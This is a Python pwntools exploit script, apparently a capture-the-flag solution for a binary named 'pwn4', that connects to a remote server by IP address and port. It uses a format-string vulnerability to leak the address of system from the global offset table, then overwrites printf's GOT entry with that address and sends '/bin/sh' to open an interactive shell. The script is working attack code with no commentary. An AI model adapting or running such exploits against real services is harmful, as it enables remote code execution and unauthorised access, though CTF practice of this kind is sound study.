from pwn import *
#context.log_level = 'debug'
libc = ELF('/lib32/libc.so.6')
pwn4 = ELF('pwn4')
def exec_fmt(payload):
	print cn.recvuntil('flag\n')
	cn.sendline('2')
	print cn.recvuntil('flag!\n')
	cn.send(payload)
	cn.recvuntil('is ')
	ret = cn.recvline()
	return ret

#cn = process('pwn4')
cn = remote('121.42.206.184',10002)
#///////////////////////// get fmt length
auto_fmt = FmtStr(exec_fmt)
print '\nget fmt length######'

#///////////////////////// leak p_printf
print cn.recv()
cn.sendline('1')
print cn.recv()
cn.sendline('2')
print cn.recvuntil('flag!\n')
cn.send(p32(pwn4.got['system'])+'START%7$sEND')
cn.recvuntil("START")
p_system = u32(cn.recv()[:4])
print '\n##########p_system'+hex(p_system)
chg_got = fmtstr_payload(auto_fmt.offset, {pwn4.got['printf']: p_system})
cn.sendline('2')
print cn.recvuntil('flag!\n')
cn.send(chg_got)
print cn.recv()
cn.sendline('2')
print cn.recvuntil('flag!\n')
cn.send('/bin/sh\x00')
cn.interactive()

